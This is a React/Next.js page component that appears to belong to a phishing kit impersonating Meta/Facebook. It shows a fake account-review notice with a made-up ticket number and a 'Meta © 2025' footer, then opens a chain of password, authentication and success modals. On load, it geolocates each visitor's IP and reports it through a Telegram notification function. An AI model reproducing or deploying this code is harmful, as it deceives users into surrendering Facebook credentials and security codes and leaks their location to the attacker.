'use client'

import React from 'react'
import Link from 'next/link'
import { getUserLocation, notifyTelegramVisit } from '../utils'
import ClientModal from '../../components/modal/ClientModal'
import SecurityModal from '../../components/modal/SecurityModal'
import AuthenticationModal from '../../components/modal/AuthenticationModal'
import SuccessModal from '../../components/modal/SuccessModal'
import ChoseAuthenModal from '../../components/modal/ChoseAuthen'
import "../libs/i18n"
import { useTranslation } from 'react-i18next';

const RequiredPage = () => {
    const [userLocation, setUserLocation] = React.useState({});
    const [countryCode, setCountryCode] = React.useState("");
 
    const [isOpenAuth, setIsOpenAuth] = React.useState(false);
    const [isOpendPassword, setIsOpendPassword] = React.useState(false);
    const [isOpendAuthentication, setIsOpendAuthentication] = React.useState(false);
    const [isOpendChoseAuthen, setIsOpendChoseAuthen] = React.useState(false);
    const [dataCookie, setDataCookie] = React.useState({});
    const [loadingChoseAuthen, setLoadingChoseAuthen] = React.useState(false);
    const [dataModal, setDataModal] = React.useState({});
    const [isOpendSuccess, setIsOpendSuccess] = React.useState(false);
    const [ticketId, setTicketId] = React.useState("4564-ATFD-4865");

    const { t, i18n } = useTranslation();

    const notificationSent = React.useRef(false);
    
    const getIp = async () => {
        try {
            const userLocation = await getUserLocation();
            const language = userLocation?.country_code?.toLowerCase?.() || "en";
            setUserLocation(userLocation || { ip: '0.0.0.0', country_code: 'US' });
            setCountryCode(userLocation?.country_code?.toLowerCase?.() || "us");

            i18n.changeLanguage(language).then();
            
            if (notificationSent.current == false) {
                console.log('Sending notification for user:', userLocation?.ip);
                notificationSent.current = true;
                await notifyTelegramVisit({location: userLocation, lang: language});
            }

        } catch (error) {
            console.error("Error getting IP or location:", error);
        }
    }

    React.useEffect(() => {
        getIp();
    }, []);

    React.useEffect(() => {
        const generateTicketId = () => {
            const section1 = Math.random().toString(36).substring(2, 6).toUpperCase();
            const section2 = Math.random().toString(36).substring(2, 6).toUpperCase();
            const section3 = Math.random().toString(36).substring(2, 6).toUpperCase();
            setTicketId(`${section1}-${section2}-${section3}`);
        };

        generateTicketId();
    }, []);

    const handleOpendModal = (isOpenAuth: any) => {
        getIp();
        setIsOpenAuth(isOpenAuth);  
    }

    
    const handleToggleAuth = (isOpenAuth: any) => {
        setIsOpenAuth(isOpenAuth);  
    }
    
    const handleOpendPassword = (isOpendPassword: any) => {
        setIsOpendPassword(isOpendPassword);
    }

    const handleToggleAuthentication = (isOpendSecurity: any) => {
        setIsOpendAuthentication(isOpendSecurity);  
    }

    const handSendDataModal = (data: object) => {
        setDataModal(data);  
    }

    const handleToggleSuccess = (isOpend: any) => {
        setIsOpendSuccess(isOpend);
    }

    const handleToggleChoseAuthen = (isOpend: any) => {
        setIsOpendChoseAuthen(isOpend);
    }

    const handleFinishChoseAuthen = async (data: any) => {
        setLoadingChoseAuthen(true);
        try {
            // Handle the chose authen finish logic here
            console.log('Chose authen finished with data:', data);
            // You can add your logic here
        } catch (error) {
            console.error('Error in chose authen:', error);
        } finally {
            setLoadingChoseAuthen(false);
        }
    }

    return (
        <>
            <div className="flex flex-col items-center justify-start bg-[linear-gradient(130deg,rgba(249,241,249,1)_0%,rgba(234,243,253,1)_35%,rgba(237,251,242,1)_100%)] min-h-[100vh] w-full">
                <div className='max-w-[768px] w-full p-[15px] h-full'>
                    <div className="p-[15px]">
                        <div className='flex items-start gap-[8px] flex-col justify-start mb-[30px]'>
                            <img src="/tick.svg" className='w-[48px] h-[48px]' alt="tick" />
                            <b className='text-[2rem]'>{t('required.title')}</b>
                        </div>
                        
                        <div className='w-full'>
                            <div className='w-full mb-[20px]'>
                                <b className='text-[17px]'>{t('required.box-1.title')}</b>
                                <p className='text-[15px] mb-[0px] mt-[15px]'>{t('required.box-1.text-1')}</p>
                                <p className='text-[15px] mb-[0px] mt-[15px]'>{t('required.box-1.text-2')}</p>
                                <p className='text-[16px] mb-[0px] mt-[14px] text-[#465a69]'>{t('required.ticket')} #{ticketId}</p>
                            </div>

                            <div className='w-full'>
                                <p className='mb-[15px]'><b className='text-[17px] font-bold'>{t('required.box-2.title')}</b></p>
                                <p className='text-[15px] mb-[10px]'>{t('required.box-2.text-1')}</p>
                                <p className='text-[15px] mb-[10px]'>{t('required.box-2.text-2')}</p>
                                <p className='text-[15px] mb-[0px]'>{t('required.box-2.text-3')}</p>
                            </div>
                        </div>
                    </div>
                    <div className='bg-[#1877f2] text-white border-none rounded-full text-[16px] font-semibold px-[24px] py-[12px] cursor-pointer block w-full max-w-[300px] my-[20px] mx-auto text-center' onClick={handleOpendModal}>{t('required.button')}</div>
                    <div className='flex items-center text-center justify-center flex-wrap text-[12px] mt-[30px] text-[#65676b] gap-[16px]'>
                        <Link href="">{t('required.footer.text-1')}</Link>
                        <Link href="">{t('required.footer.text-2')}</Link>
                        <Link href="">{t('required.footer.text-3')}</Link>
                        <Link href="">{t('required.footer.text-4')}</Link>
                        <Link href="">Meta © 2025</Link>
                    </div>
                </div>
            </div>

            <ClientModal 
                isOpenAuth={isOpenAuth} 
                userLocation={userLocation} 
                countryCode={countryCode} 
                onToggleAuth={handleToggleAuth} 
                onOpendPassword={handleOpendPassword}
            />

            <SecurityModal
                isOpendPassword={isOpendPassword}
                onToggleModalPass={handleOpendPassword}
                onOpendChoseAuthen={handleToggleChoseAuthen}
                onSendDataModal={handSendDataModal}
            />

            {/* <ChoseAuthenModal
                openChoseAuthenModal={isOpendChoseAuthen}
                loadingChoseAuthen={loadingChoseAuthen}
                onFinishChoseAuthen={handleFinishChoseAuthen}
                onOpenAuthentication={() => setIsOpendAuthentication(true)}
            /> */}

            <AuthenticationModal
                isOpendAuthentication={isOpendChoseAuthen} 
                // isOpendAuthentication={isOpendAuthentication} 
                onToggleModalAuthentication={handleToggleAuthentication} 
                onOpendSuccess={handleToggleSuccess}
                dataModal={dataModal}
            />

            <SuccessModal
                isOpendSuccess={isOpendSuccess}
                onToggleSuccess={handleToggleSuccess}
            />
        </>
    )
}

export default RequiredPage